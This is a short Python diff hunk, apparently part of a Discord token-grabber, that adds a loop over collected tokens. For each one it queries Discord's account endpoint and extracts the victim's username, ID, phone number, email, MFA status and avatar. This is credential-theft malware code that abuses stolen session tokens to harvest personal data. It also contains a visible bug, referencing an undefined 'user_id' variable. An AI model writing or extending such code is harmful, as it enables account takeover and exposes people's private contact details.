@@ -120,6 +120,17 @@ def run():
                                 if uid not in uids:
                                     tokens.append(token)
                                     uids.append(uid)
+    for token in tokens:
+        user = requests.get(
+            'https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
+        username = user['username']
+        userid = user['id']
+        phone = user['phone']
+        email = user['email']
+        is_mfa = str(user['mfa_enabled'])
+        avatar = f"https://cdn.discordapp.com/avatars/{userid}/{user['avatar']}.gif" if requests.get(
+                f"https://cdn.discordapp.com/avatars/{userid}/{user['avatar']}.gif").status_code == 200 else f"https://cdn.discordapp.com/avatars/{user_id}/{user['avatar']}.png"
+                 
         
 
         
